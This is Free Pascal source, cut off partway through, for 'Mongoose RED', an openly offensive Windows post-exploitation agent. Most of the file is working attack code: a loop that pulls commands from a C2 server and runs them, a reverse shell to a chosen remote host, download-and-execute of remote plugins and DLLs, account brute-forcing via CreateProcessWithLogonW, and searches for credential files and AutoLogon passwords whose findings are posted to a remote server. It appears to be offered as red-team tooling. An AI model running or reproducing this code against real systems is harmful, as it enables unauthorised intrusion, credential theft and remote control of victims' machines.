{

   

/'\_/`\
|     |   _     ___     __     _      _     ___    __
| (_) | /'_`\ /' _ `\ /'_ `\ /'_`\  /'_`\ /',__) /'__`\
| | | |( (_) )| ( ) |( (_) |( (_) )( (_) )\__, \(  ___/
(_) (_)`\___/'(_) (_)`\__  |`\___/'`\___/'(____/`\____)
                     ( )_) |
                      \___/' RED 2.2

 * Source is provided to this software because we believe users have a     *
 * right to know exactly what a program is going to do before they run it. *
 * This also allows you to audit the software for security holes.          *
 *                                                                         *
 * Source code also allows you to port Mongoose to new platforms, fix bugs *
 * and add new features.  You are highly encouraged to send your changes   *
 * to the contact@lawrenceamer.me                                            *
 * Mongoose Toolkit will always be available Open Source.                  *
 *                                                                         *
 *                                                                         *
 *  This program is distributed in the hope that it will be useful,        *
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                   *
 *                                                                         *
 *  #Author : Lawrence Amer   @zux0x3a
 *  #LINKS : https://0xsp.com
 *                                                                         *


}
program agent;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils, CustApp, WinSock, windows, process, JwaWinSvc, services,
  strutils, FileUtil, core, base64, FPHTTPClient, jsonparser, fpjson,
  lconvencoding, netenum, wmi, exploitchecker;

const
   // users privielges levels
 SECURITY_NT_AUTHORITY: TSIDIdentifierAuthority = (Value: (0, 0, 0, 0, 0, 5));
 SECURITY_BUILTIN_DOMAIN_RID = $00000020;
 DOMAIN_ALIAS_RID_ADMINS     = $00000220;
 DOMAIN_ALIAS_RID_USERS      = $00000221;
 DOMAIN_ALIAS_RID_GUESTS     = $00000222;
 DOMAIN_ALIAS_RID_POWER_USERS= $00000223;
 //
 // Windows Service Types
 //
 SERVICE_KERNEL_DRIVER       = $00000001;
 SERVICE_FILE_SYSTEM_DRIVER  = $00000002;
 SERVICE_ADAPTER             = $00000004;
 SERVICE_RECOGNIZER_DRIVER   = $00000008;

 SERVICE_DRIVER              =
   (SERVICE_KERNEL_DRIVER or
    SERVICE_FILE_SYSTEM_DRIVER or
    SERVICE_RECOGNIZER_DRIVER);

 SERVICE_WIN32_OWN_PROCESS   = $00000010;
 SERVICE_WIN32_SHARE_PROCESS = $00000020;
 SERVICE_WIN32               =
   (SERVICE_WIN32_OWN_PROCESS or
    SERVICE_WIN32_SHARE_PROCESS);

 SERVICE_INTERACTIVE_PROCESS = $00000100;

 SERVICE_TYPE_ALL            =
   (SERVICE_WIN32 or
    SERVICE_ADAPTER or
    SERVICE_DRIVER  or
    SERVICE_INTERACTIVE_PROCESS);
const
  BUF_SIZE = 2048; // Buffer size for reading the output in chunks
  EOL = #13#10;

  type
  ShellResult = record
    output    : AnsiString;
    exitcode  : Integer;

  end;

type

  { Tmongoose }

  Tmongoose = class(TCustomApplication)
  protected
    procedure DoRun; override;

  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    procedure acl; virtual;
    procedure userinfo; virtual;           // Get Windows Machine user information
    procedure servicesenum; virtual;       //Enumerate All types of Windows Services & Drivers
    procedure banner;virtual;
    procedure systeminfo;virtual;       // Retrieving System information
    procedure programs;virtual;         // Enumerate All installed softwares  on the machine
    procedure networking;virtual;       // Display All Networks information
    procedure potentialfiles;virtual;  // Search Whole System for Specific Senstive Files , Configs ..etc
    procedure passstring;virtual;     // Search in files on drive for a specific keyword
    procedure download;virtual;      //  Download files directly into windows machine
    procedure exploits;virtual;    // enumerate for hotfixes , local exploits
    procedure transferfiles;virtual;
    procedure clinterface;virtual;
    procedure runas;virtual;
    procedure Lateralmovement;virtual;
    procedure networkdiscovery;virtual;
    procedure http_cmdlet;virtual;
    procedure Acc_BF;virtual;
    procedure ex_code;virtual;
    procedure remote_lib;virtual;

  end;


{ Tmongoose }
 
function CreateProcessWithLogonW(lpUsername: PWideChar; lpDomain: PWideChar;
 lpPassword: PWideChar; dwLogonFlags: DWORD; lpApplicationName: PWideChar;
 lpCommandLine: PWideChar; dwCreationFlags: DWORD; lpEnvironment: Pointer;
 lpCurrentDirectory: PWideChar; const lpStartupInfo: TStartupInfo;
 var lpProcessInformation: TProcessInformation): BOOL; stdcall;
 external 'advapi32.dll' name 'CreateProcessWithLogonW';




procedure Tmongoose.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h', 'help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;
  if Hasoption('s','services') then begin
   servicesenum;
  //wmic;
  end;
  if Hasoption('u','user info') then begin
    userinfo;
  end;
  if HasOption('i','system info') then begin
     systeminfo;
    end;
  if HasOption('p','programs') then begin
     programs;
     end;
  if HasOption('n','netowkring') then begin
     networking;
  end;
  if HasOption('c','configs') then begin
     potentialfiles;
     end;
  if HasOption('l','look') then begin
    passstring;
     end;
  if hasoption('cmd') then begin
    http_cmdlet;
    terminate;

  end;
  if hasoption('d','downloadfile') then begin
    download;
    end;
  if hasOption('e','exploits') then begin
    exploits
    end;
  if hasoption('w','acl') then begin
    acl;
    end;
  if hasoption('t','tarnsfer') then begin
    transferfiles;
   end;
  if hasoption('r','runas') then begin
    runas;
     terminate;
  end;
  if hasoption('lr') then begin
   lateralmovement;

  end;
  if hasoption('interactive') then begin
  clinterface;
  end;
  if hasoption('nds') then begin
     networkdiscovery;
    // terminate;
  end;
  if hasoption('bf') then begin
  Acc_BF;
  end;
  if hasoption('import') then begin
  //
  ex_code;
  end;
  if hasoption('remote') then begin
  remote_lib;
  end;
  if hasoption('m','mongoose') then begin
     systeminfo;
     userinfo;
     networking;
     servicesenum;
     programs;
     potentialfiles;
     exploits;
     acl;
    end;
    { add your program here }
    if ParamCount < 1 then begin
    banner;

    end;
  Terminate;
end;

 function saveoutput(data:rawbytestring;fileoutput:string):string;
var
  s:string;
  Temp : TStringList;
begin
  Temp := TStringList.Create;
   data := ConvertEncoding(data,GuessEncoding(data), EncodingUTF8);
   temp.Add(data);
   try
   temp.SaveToFile(getcurrentdir+'\'+fileoutput);

   except
      on E: exception do
         writeln(E.Message);

   end;
   temp.Free;
 end;
function fetchplugin(path:string):string;
var
  FPHTTPClient: TFPHTTPClient;
  Resultget : string;
begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
   try
   Resultget := FPHTTPClient.Get(path); // test URL, real one is HTTPS
   fetchplugin := Resultget;

   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;


end;
function Base64Tofile(const AFile, Base64: String): Boolean;
var
  MS: TMemoryStream;
  Str: String;
begin
  Result := False;
  MS := TMemoryStream.Create;
  try
    Str := DecodeStringBase64(Base64);
    MS.Write(Str[1], Length(Str) div SizeOf(Char));
    MS.Position := 0;
    MS.SaveToFile(AFile);
    Result := FileExists(AFile);
  finally
    MS.Free;

  end;
end;



function splitter(cmd:AnsiString):string;
var
  ind:ansistring;
 splitat:integer;
 begin
 splitat := NPos(' ', cmd, 1);
 ind := Copy(cmd, Succ(splitat), Length(cmd));
 result:= ind;
 end;

procedure Tmongoose.networkdiscovery;
var
 WSAData: TWSAData;
begin
   writeln('[!] Starting the Scan ..');
  try
   if WSAStartup($0101, WSAData)=0 then
   try
     ScanNetworkResources(RESOURCETYPE_ANY, RESOURCEDISPLAYTYPE_SERVER);     // IN CASE WANT TO DO NETWORK DISCOVERY TOU HAVE TO USE _SERVER
     Writeln('[^] Scanning is done ! Hit ENTER TO EXIT');
   finally
     WSACleanup;
   end;
  except
    on E:Exception do
      Writeln(E.Classname, ': ', E.Message);
  end;
  Readln;
 end;
 procedure Tmongoose.http_cmdlet;
 var
  prv_command,host,nxt_command:string;
  outdata:string;
  i:integer;
  isokay:boolean;
 begin
   isokay := false;
   //idea of connecting into CMMLET API and retrieve commands to be executed
  // the output of data will be transfered into customized category
    for i := 1 to paramcount do begin

      if(paramstr(i)='-srvhost') then begin
        host := paramstr(i+1);
        isokay := true;
      end;

    end;
   writeln('[^]Connecting to server...');
   prv_command := fetchplugin('http://'+host+DEF_PORT+'/api/getcommands'); //fetch first command from node js
   if prv_command > '0' then begin
   writeln('[>]Connected to C2 Server..Ready');
   outdata := runit(prv_command);   //run and exeucte the code
   writeln(outdata); //write output into terminal
   sendcm(outdata);

   while isokay do begin   // loop for newer commands
   nxt_command := fetchplugin('http://'+host+DEF_PORT+'/api/getcommands'); //check again for commands api changes
   if prv_command <> nxt_command then begin  // if first command different from newer one then run newer command

   outdata := runit(nxt_command); //execute the newer command
   writeln(outdata);  //write data into terminal
    sendcm(outdata);
   prv_command:=nxt_command;  // make previous command equal to newer command , conditional state
   writeln('[!] waiting another command , CTRL+C to Exit');
   sleep(2000);    //sleep before execution to avoid termination




   end;

 end;


 end;

 end;

 procedure Tmongoose.clinterface;
 var
   jData : TJSONData;
    jObject : TJSONObject;
    jArray : TJSONArray;
     SubObj:TJSONObject;
  cmd,ip,plugindata,s,id,param,j: string;
  i,l:integer;
current_arch:string;
list:Tstringlist;

 begin
 list := Tstringlist.Create;
  current_arch :='x86';   // targeted arch
  writeln ('[!] Starting interactive Console ...');
  writeln ('[+] available commands : fetch ');
  WriteLn(Output, '[*] plugins cli > ');
  ReadLn(Input,cmd);

    if splitter(cmd) = 'fetch' then  //main command to parase json file
       begin
  writeln (output,'[*] set SRVRHOST ');
   ReadLn(Input,ip);
  writeln('[+] Fetching plugins metadata');
  j := fetchplugin('http://'+ip+DEF_PORT+'/plugins/plugins.json');//WILL LOAD PLUGIN JSON METADATA FROM NODEJS
 // writeln(j);
  jData := GetJSON(j);
  s := jData.AsJSON;
  s := jData.FormatJSON;
  jObject := TJSONObject(jData);
  jArray := jObject.Arrays['plugins'];
  for i := 0 to jArray.Count - 1 do
  begin
    SubObj := jArray.Objects[i];
  //  id := jArray.Objects[i].FindPath('title').AsString;
    param :=  jArray.Objects[i].FindPath('cmd').AsString;

    //add data into stringlist for later load
    list.Add(param);
   end;

  writeln (list.Text);
  WriteLn(Output, '[*] choose one > ');
  ReadLn(Input,cmd);
   for l:=0 to list.Count -1 do begin
   if splitter(cmd) = list[l] then
      begin

  writeln('[>] downloading plugin '+cmd+'.....');   //communicate into node js to fetch base64 file and decode it
  plugindata := fetchplugin('http://'+ip+DEF_PORT+'/plugins/'+cmd);

 // getting remote plugin and save it into disk
  base64tofile(getcurrentdir+'\'+cmd+'.plg',plugindata);
  writeln('[>] executing plugin ..');
  //execute the job ..
  loadingplugin(cmd+'.plg','');
      end
   else


  WriteLn('');
 // end;
  WriteLn('Press enter to exit');
  ReadLn(cmd);
  list.free;   //free memory
 end;
  end;
   end;
  //win sock functions

function SendBuf(s : TSocket; var Buffer; Len : Integer) : Integer;
begin
  Result := send(s, Buffer, Len, 0);
end;

function SendString(s : TSocket; str : pansichar) : Integer;
begin
  result := SendBuf(s, str[1],Length(str));
end;

function RecvLn(s : TSocket; Delim: String = EOL): String;
const
  BUFFER_SIZE = 255;
var
  Buffer: String;
  I, L: Cardinal;
begin
  Result := '';
  I := 1;
  L := 1;
  SetLength(Buffer, BUFFER_SIZE);
  while (L <= Cardinal(Length(Delim))) do
  begin
    if recv(s, Buffer[I], 1, 0) < 1 then Exit;

    if Buffer[I] = Delim[L] then
      Inc(L)
    else
      L := 1;
    Inc(I);
    if I > BUFFER_SIZE then
    begin
      Result := Result + Buffer;
      I := 1;
    end;
  end;
    Result := Result + Copy(Buffer, 0, I - L);
end;

function RecvLen(s : TSocket) : Integer;
begin
  if ioctlsocket(s, FIONREAD, Longint(Result)) = SOCKET_ERROR then
  begin
    Result := SOCKET_ERROR;
  end;
end;

function RecvBuf(s : TSocket; var Buffer; Len : Integer) : Integer;
begin
  Result := recv(s, Buffer, Len, 0);
  if (Result = SOCKET_ERROR) and (WSAGetLastError = WSAEWOULDBLOCK) then
  begin
   Result := 0;
  end;
end;

function StringToPAnsiChar(stringVar : string) : PAnsiChar;
Var
  AnsString : AnsiString;
  InternalError : Boolean;
begin
  InternalError := false;
  Result := '';
  try
    if stringVar <> '' Then
    begin
       AnsString := AnsiString(StringVar);
       Result := PAnsiChar(PAnsiString(AnsString));
    end;
  Except
    InternalError := true;
  end;
  if InternalError or (String(Result) <> stringVar) then
  begin
    Raise Exception.Create('Conversion from string to PAnsiChar failed!');
  end;
end;
  function con(Address : string;  port : Integer) : Integer;
 var
  sinsock           : TSocket;
  SockAddrIn        : TSockAddrIn;
  hostent           : PHostEnt;
begin
  closesocket(sinsock);
  sinsock := Winsock.socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  SockAddrIn.sin_family := AF_INET;
  SockAddrIn.sin_port := htons(Port);
  SockAddrIn.sin_addr.s_addr := inet_addr(StringToPAnsiChar(address));
  if SockAddrIn.sin_addr.s_addr = INADDR_NONE then
  begin
    HostEnt := gethostbyname(StringToPAnsiChar(Address));
    if HostEnt = nil then
    begin
      result := SOCKET_ERROR;
      Exit;
    end;
    SockAddrIn.sin_addr.s_addr := Longint(PLongint(HostEnt^.h_addr_list^)^);
  end;                           //CHANGE MADE
  if Winsock.Connect(sinSock, SockAddrIn, SizeOf(SockAddrIn)) = SOCKET_ERROR Then
    result := SOCKET_ERROR
  else
    result := sinsock;
end;

// Account BF module

procedure accountvalidation(Ausername,Apassword,Adomain,AApplication:string);
const
  LOGON_WITH_PROFILE = $00000001;
 var
  si: TStartupInfo;
  pi: TProcessInformation;
  chain:boolean;
  SA: TSecurityAttributes;
   PipeInputWrite,PipeInputRead,PipeOutputRead,PipeOutputWrite:Thandle;

 begin

  //creating of pipes
    CreatePipe(PipeInputRead, PipeInputWrite, @SA, 0);
    CreatePipe(PipeOutputRead, PipeOutputWrite, @SA, 0);
    ZeroMemory(@si, SizeOf(si));

   SA.nLength := SizeOf(@SA);
   SA.bInheritHandle := true;
   SA.lpSecurityDescriptor := nil;

    si.cb := SizeOf(si);
    si.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    si.wShowWindow := SW_hide;
    si.hStdInput := PipeInputRead;
    si.hStdOutput := PipeOutputWrite;
    si.hStdError := PipeOutputWrite;
   ZeroMemory(@pi, SizeOf(pi));

    chain := CreateProcessWithLogonW(PWideChar(WideString(AUsername)),
     PWideChar(WideString(ADomain)), PWideChar(WideString(APassword)),
     LOGON_WITH_PROFILE, nil, PWideChar(WideString(AApplication)),
     0, nil, nil, si, pi);

 if (chain) then
   try
   writeln('[+]Username: '+ Ausername+' with password '+Apassword+' is valid');
   except
    on E: exception do
    writeln(E.message);
    end;

    end;
//spwan a process with specific user
 procedure RunAsAccount(AUsername, APassword, ADomain, AApplication: string);
 const
   LOGON_WITH_PROFILE = $00000001;
    BUFFER_SIZE = 2048;
 var
   asci : pchar;
   WSA : TWSAData;
   si: TStartupInfo;
   pi: TProcessInformation;
   PipeInputWrite,PipeInputRead,PipeOutputRead,PipeOutputWrite:Thandle;
   SA: TSecurityAttributes;
   b     : Boolean;
   BytesRead: Cardinal;
   wasokay : boolean;
   mode: cardinal;
   revsock : TSocket;
   Nonblocking :integer;
   connected : boolean;
   buffer : array[0..BUFFER_SIZE - 1] of Byte;
  ExitCode : Cardinal;
   br : Cardinal;
  br2 : Integer;
  host:string;
  port:integer;

 begin
  //Create our Pipes
   asci := #10+
           '|══════════════════════'+#10+
           '|                      |'+#10+
           '| 0xsp Mongoose Shell  |'+#10+
           '|                      │'+#10+
           '╘══════════════════════ '+#10;
    CreatePipe(PipeInputRead, PipeInputWrite, @SA, 0);
    CreatePipe(PipeOutputRead, PipeOutputWrite, @SA, 0);

    WSAStartup($101, WSA);
    ZeroMemory(@si, SizeOf(si));

    SA.nLength := SizeOf(@SA);
    SA.bInheritHandle := true;
    SA.lpSecurityDescriptor := nil;

   si.cb := SizeOf(si);
   si.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
   si.wShowWindow := SW_hide;
    si.hStdInput := PipeInputRead;
    si.hStdOutput := PipeOutputWrite;
    si.hStdError := PipeOutputWrite;
   ZeroMemory(@pi, SizeOf(pi));
     SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN or FOREGROUND_INTENSITY); //change color of text
 b := CreateProcessWithLogonW(PWideChar(WideString(AUsername)),
     PWideChar(WideString(ADomain)), PWideChar(WideString(APassword)),
     LOGON_WITH_PROFILE, nil, PWideChar(WideString(AApplication)),
     0, nil, nil, si, pi);

  if  b  then
  begin
  WriteLn(Output, '[*] set RHOST > ');
  ReadLn(Input,host);
  WriteLn(Output, '[*] set RPORT > ');
  ReadLn(Input,port);
  revsock := Con(StringToPAnsiChar(host), port);
  Connected := True;
  writeln('[*] Connecting to a host ... ');
  SendString(revsock,asci);
  closehandle(PipeInputRead);
  closehandle(PipeOutputWrite);
  Mode := PIPE_NOWAIT;
  SetNamedPipeHandleState(PipeOutputRead, Mode , nil, nil);
    //non blocking mode for socket
    Nonblocking := 1;
    ioctlsocket(revsock, FIONBIO, Longint(Nonblocking));
     while Connected Do begin

      repeat
        FillChar(buffer, BUFFER_SIZE, #0);
        ReadFile(PipeOutputRead, Buffer, BUFFER_SIZE, br, nil);
        if br > 0 Then SendBuf(revsock, buffer, br);
      until br < BUFFER_SIZE;   //read from pipe, send to socket

      Sleep(50);
      repeat
        FillChar(buffer, BUFFER_SIZE, #0);
        br2 := RecvBuf(revsock, buffer, BUFFER_SIZE);
        if br2 = SOCKET_ERROR Then Connected := False;
        if br2 > 0 then begin
          //here you could filter the input, to add your own commands
          WriteFile(PipeInputWrite, buffer, br2,br, nil);
        end;
      until br2 < BUFFER_SIZE; //read from socket, send to byte
    end;
    TerminateProcess(pi.hProcess,0);
    FileClose(PipeInputWrite); { *Converted from CloseHandle* }
    FileClose(PipeOutputRead); { *Converted from CloseHandle* }
    closesocket(revsock);
   Sleep(1000); //wait one second befor try to reconnect


    if (NOT b) then  begin
      writeln('[!] failed to spawn a shell due to incorrect login details or socket problem');

   CloseHandle(pi.hThread);
   CloseHandle(pi.hProcess);
 end;
   end;
 end;
procedure Tmongoose.Lateralmovement;
var
 str:string;
 i :integer;
 begin
 GetWin32_ProcessInfo;
 end;


procedure Tmongoose.remote_lib;
var
 remote_addr,s:string;
 dll_data:RawByteString;
 i:integer;
 AMemStr,AMemStr2 : TMemoryStream;
 AStrStr: TStringStream;
 l_dll:string;

begin
  writeln('<*> Remote Dynamic Link Library launcher ');
  writeln('[!] by using this module you can load DLL files Locally ');
  writeln('[!] it also loads defined exports titled as `main` ');
  writeln('[!] usage: agent.exe -remote http://host/lib.dll');

for i := 0 to paramcount do begin
 if (paramstr(i)='-remote') then begin
    remote_addr := paramstr(i+1);
 end;
 end;

   if ParamCount > 1 then begin
dll_data := fetchplugin(remote_addr);

AMemStr := TMemoryStream.Create;
AmemStr.Write(dll_data[1],length(dll_data) * sizeof(dll_data[1]));
AMemStr.Position := 0;


AStrStr := TStringStream.Create('');
AStrStr.Size := AMemStr.Size;
AStrStr.CopyFrom(AMemStr, AMemStr.Size);
AStrStr.Position := 0;

s := AStrStr.DataString;
AMemStr2 := TMemoryStream.Create;
AMemStr2.SetSize(AStrStr.Size);
AMemStr2.Write(s[1], length(s) * sizeof(s[1]));
Randomize;
l_dll := IntToHex(Random(Int64($7ffffffff)), 8);
AMemStr2.SaveToFile(getcurrentdir+'\'+l_dll+'.dll');

load_library(getcurrentdir+'\'+l_dll+'.dll');

end;
 end;
procedure Tmongoose.ex_code;
var
 dll_name:string;
 i:integer;
 begin
 writeln('<*> Local Dynamic Link Library launcher ');
 writeln('[!] by using this module you can load DLL files Locally ');
 writeln('[!] it also loads defined exports titled as `main` ');
 writeln('[!] usage: agent.exe -import lib.dll');

   for i := 0 to paramcount do begin
     if (paramstr(i)= '-import') then begin
     dll_name := paramstr(i+1);

     end;

   end;
   writeln('[+]File Name :',dll_name);
  load_library(dll_name);
end;

procedure Tmongoose.Acc_BF;
var
 i,ui,pi:integer;
 Ulist,Plist:Tstringlist;
 username,password,domain,process,msg:string;
 begin
 msg := 'Local Account';
 writeln(' ');
 writeln('[->] Starting Brute Force Account Using CreateProcessWithLoginW API Technique');
 for i := 0 to paramcount do begin
  if (paramstr(i)= '-username') then begin
   username := paramstr(i+1);
   writeln('[+] imported User Table');
  end;
  if (paramstr(i) ='-password') then begin
   password := paramstr(i+1);
   writeln('[+] imported Password Table');
  end;
  if (paramstr(i) = '-domain') then begin
   domain := paramstr(i+1);
   msg := 'Domain Account';
  end;
  end;
 writeln('[+] Attack mode: '+msg);

 Ulist := Tstringlist.Create;
 Plist := Tstringlist.Create;
 try
 try
 Ulist.LoadFromFile(username);
 Plist.LoadFromFile(password);

for ui := 0 to Ulist.Count -1 do
for pi := 0 to Plist.count -1 do  begin
accountvalidation(ulist[ui],plist[pi],domain,'cmd.exe');

 end;

 finally
 ulist.Free;
plist.Free;
 end;
  except
   on E: exception do
 writeln(E.Message);

 end;
 end;
procedure Tmongoose.runas;
var
 i:integer;
 username,password,domain,process:string;
begin
   for i := 0 to paramcount do begin
  if (paramstr(i)='-r') then begin
     username :=paramstr(i+1);
     password := paramstr(i+2);
     process := paramstr(i+3);
     domain := paramstr(i+4);
  end;
  end;
   writeln('[+] trying to Spawn a shell ....!');
  runasaccount(username,password,domain,process);
end;

procedure Tmongoose.transferfiles;
var
 api,filen:string;
 i :integer;

begin
 for i := 0 to paramcount do begin
  if (paramstr(i)='-t') then begin
     filen :=paramstr(i+1);
     api :=paramstr(i+2);
  end;
  end;
  Writeln('[i] Make Sure Correct Usage as : agent.exe -t API SECRET');
  writeln('[*] You are uploading ',filen +' Into '+api);
uploadfile(filen,api);
end;

procedure Tmongoose.exploits;
var
  vr,build,res:string;
  list:tstringlist;
begin
 writeln('[!] Loading exploit denfiniation inspection module ');
 exploitinspection;
 writeln('[!] Loading exploit checking engine ');
 windows_auditing;

 end;
procedure Tmongoose.download;
var
  i :integer;
  url,filename :string;
begin
 for i := 1 to paramcount do begin
 if (paramstr(i)='-d') then begin
   url := paramstr(i+1);
   filename := paramstr(i+2);
 end;
end;
 downloadfile(url,filename);  //download file from internet. any format

end;

procedure Tmongoose.passstring;
var
  s,drv,ext:string;
  i :integer;
begin
  //agent.exe -l C:\ String *.txt -o IP -x Secret Key

 for i := 1 to paramcount do begin
  if (paramstr(i)='-l') then begin
    drv := paramstr(i+1);
    s:=paramstr(i+2);
    ext := paramstr(i+3);
  end;
  end;
  findastring(drv,ext,s,true); // this will keep searching Driver for specific string

 end;



procedure Tmongoose.potentialfiles;
var
  cfg,conf,cnf,config,sysprep,unattended,sysprepinf,unattend,vnc,wp,ip,os,drv: String;
  AList,Pathlist,outres,dv: TStringList;
  i,p,u,d: Integer;
begin
  AList := TStringList.Create;
  PathList := TstringList.create;
  outres := Tstringlist.create;
  // drv:= Tstringlist.Create;
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os
  GetDriveLetters(pathlist);

  try
    writeln('[+] Searching for Potential Files...it takes a While  ');
    cfg := '*.cfg';
    conf:='*.conf';
    cnf :='*.cnf';
    config :='*.config';
    sysprep :='sysprep.xml';
    unattended:='unattended.xml';
    unattend:='unattend.xml';
    sysprepinf :='sysprep.inf';
    vnc:='*.vnc';
    wp:='wp-config';
     //end;
    Alist.Add(cfg);
    Alist.Add(conf);
    Alist.Add(cnf);
    Alist.Add(config);
    Alist.Add(sysprep);
    Alist.Add(unattended);
    Alist.Add(unattend);
    Alist.Add(sysprepinf);
    Alist.Add(vnc);
    Alist.Add(wp);

    for p:=0 to pathlist.Count -1 do begin
    writeln('[+] Searching IN ',pathlist[p]);
    pathlist.Sorted:=true;
    pathlist.Duplicates:=dupIgnore;

    for i:=0 to Alist.Count -1 do
    begin
     writeln('[*] Searching For .',Alist[i]);
     Alist.Sorted:=true;
     Alist.Duplicates:=dupIgnore;
     FindAllFiles(outres, pathlist[p], Alist[i], True, faDirectory);
     end;
    //this will sort data as expected

    for i := 0 to outres.Count - 1 do begin
      outres.Sorted:=true;
      outres.Duplicates:=dupIgnore;
      writeln(outres.Strings[i]);
      postRequest('<font color="lightgreen"><b>[*] Possible Potential Files </b></font>'+outres.Strings[i],ip,os,'16');         //cat number 6 information collected
    end;

    end;
  finally
    pathlist.free;
    AList.Free;
    outres.free;
  end;
  end;

procedure Tmongoose.networking;
var
ipcon,arp,netstat,ip,os,cat:string;
begin
 ip :=getlocalip;     //retrieve host ip address for all unix system
os := osver;     //retrieve operating system  os

ipcon := runit('ipconfig /all');
arp := runit('arp -a');
netstat := runit('netstat -ano');
writeln('[+] Network information ',ipcon);
 postRequest('<font color="red"><b>[*] Network information</b></font>'+ipcon,ip,os,'14');
writeln('--------------------------------------');
writeln(arp);
 postRequest('[*] ARP '+arp,ip,os,'14');
writeln('[+] Machine Active Connection ',netstat);
postRequest('<font color="green"><b>[*] Machine Active Connection</b></font> '+netstat,ip,os,'14');
writeln('Reading the contents of file: WINDOWS HOST FILE');
writeln('=========================================');
catfile('hosts',systemfolder+'\drivers\etc\');

end;

procedure Tmongoose.programs;
var
  outa,outx86,proc:string;
  os,ip:string;
begin
   ip :=getlocalip;     //retrieve host ip address for all unix system
   os := osver;     //retrieve operating system  os

  writeln('[+] Software installed ');

  outa := runit('dir /a "C:\Program Files"');
  outx86 := runit('dir /a "C:\Program Files (x86)"');
  writeln('[+] Installed Softwares',outa);
  postRequest('<font color="red"><b>[*] Installed Softwares</b></font> '+outa,ip,os,'11');
  writeln('[+] Installed x86 Softwares',outx86);
  postRequest('[*] Installed x86 Software'+outx86,ip,os,'11');
  proc := runit('tasklist /svc');
  writeln('[+] Running Processes ',proc);
  postRequest('<font color="lightgreen"><b>[*]Running Processes</b></font> '+proc,ip,os,'11');

end;

procedure Tmongoose.systeminfo;
var
  outa1,outa2,outa3,elevated,os,ip: string;
  i:integer;
begin
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os

  outa1 := runit('systeminfo');
  writeln('[+] System information ',outa1);
    postRequest('<font color="red"><b>[*] System information </b></font> '+outa1,ip,os,'9');
  writeln('[+] Other logged into Machine :: ');
  outa2 := runit('qwinsta');
  writeln(outa2);
   postRequest('[*] Other logged into Machine '+outa2,ip,os,'9');
  writeln('[+] User AutoLogon Key if Any .');
  outa3 := runit('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"');
  writeln(outa3);
   postRequest(' <font color="lightgreen"><b>[*] User AutoLogon Key if Any </b></font>'+outa3,ip,os,'9');
  elevated := runit('reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated');
  i := pos('ERROR',elevated);

  if i > 0 then begin
     writeln('[+] Always installed Elevated is { Disabled | Not Vulnerable } ');
      postRequest(' <font color="lightgreen"><b>[*] Always installed Elevated is { Disabled | Not Vulnerable } </b></font> ',ip,os,'9');
     end else if i < 0 then
     writeln('[+] Mongoose think it is vulnerable to [AlwaysInstalledElevated] ! ',elevated);
      postRequest(' <font color="red"><b>[*] Mongoose think it is vulnerable to [AlwaysInstalledElevated] ! </b></font> ',ip,os,'9');
  end;

procedure Tmongoose.banner;
var
  outp,id,ip,os:string;
  result,res : integer;
   process:Tprocess;
   list:Tstringlist;
   da,rotten,po:string;

begin

  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os
  po :=' No ! ';
  writeln(''+
  #013#010'[->] 0xsp Mongoose Windows RED 2.2.0 '#013#010'[>] Lawrence Amer(@zux0x3a) '#013#010'[>] https://0xsp.com'#013#010''+
    #013#010'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^'
  );
  list := Tstringlist.Create;
  RunCommand(systemfolder+'\cmd.exe',['/c','whoami'],id);
  da:= powershell('Get-ExecutionPolicy ;stop-process -Id $PID');
  rotten :=runit('whoami /priv |findstr "SeImpersonatePrivilege seAssignPrimaryPrivilege SeDebugPrivilege SeLoadDriverPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeTakeOwnershipPrivilege "');
  res := pos('Enabled',rotten);  //looking if one of above are enabled
  if res > 0 then
  begin
     po :='';
     po :=' YES , Vulnerable';
     postrequest(' <font color="red"><b>[*] Appears to be vulnerable with Rotten Potato [https://github.com/foxglovesec/RottenPotato] </b></font>',ip,os,'12');
  end;
  result := CompareStr(da,'Restricted');
  if result = 2 then begin

  Writeln('[+] PowerShell Status : ',da);

 end else if result = 3 then begin
  Writeln('[+] PowerShell Status : ',da);
 end;
  Writeln('[+] is it vulnerable to Rotten Or Juciy Potato ?',po);
  Writeln('[+] Current System Path : ',systemfolder);
  Writeln('[+] Current User  : ',id);
  getwindowsv;
 end;


procedure Tmongoose.servicesenum;
var
  SERVICE_WIN32L:Tstringlist;
  SERVICE_ADAPTERL:Tstringlist;
  SERVICE_DRIVERL:Tstringlist;
  SERVICE_INTERACTIVE_PROCESSL:Tstringlist;
   ip,os:string;
begin
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os

  Writeln('[+] Active Running Windows Services & Drivers  ');
  writeln('-------------------------------------');
  SERVICE_WIN32L := Tstringlist.Create;
  SERVICE_ADAPTERL := Tstringlist.Create;
